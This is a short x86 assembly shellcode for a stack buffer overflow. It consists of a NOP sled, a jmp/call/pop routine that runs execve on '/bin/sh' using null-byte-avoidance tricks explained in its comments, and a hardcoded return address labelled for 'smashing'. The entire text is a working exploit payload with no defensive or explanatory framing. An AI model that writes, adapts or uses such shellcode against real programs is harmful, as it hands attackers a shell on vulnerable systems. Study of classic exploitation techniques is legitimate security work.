nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
	jmp _want_bin_bash
_got_bin_bash:
	xor eax, eax #getting a 0 without having one in code
	pop ebx #from the call trick bellow, load pointer to "/bin/sh@"
	mov [ebx+7] , eax #replace @ with \0 terminator
	
	mov eax , 0xFFFFFFFC #code for execev is 0x0b, we use a zero trick
	mov ecx , 0xFFFFFFF1 
	sub eax , ecx

	lea ecx , [ebx+7] #pass a pointer to a null terminator (arguments list is empty)
	mov edx , [ebx+7] #pass a pointer to a null terminator (arguments list is empty)
	int 0x80 #syscall
_want_bin_bash:
	call _got_bin_bash #"call trick" to get a pointer to the "/bin/sh@" string
	.ASCII "/bin/sh@" # the "/bin/sh@" string
#the jump address for smashing!
	.int 0xbfffdfc0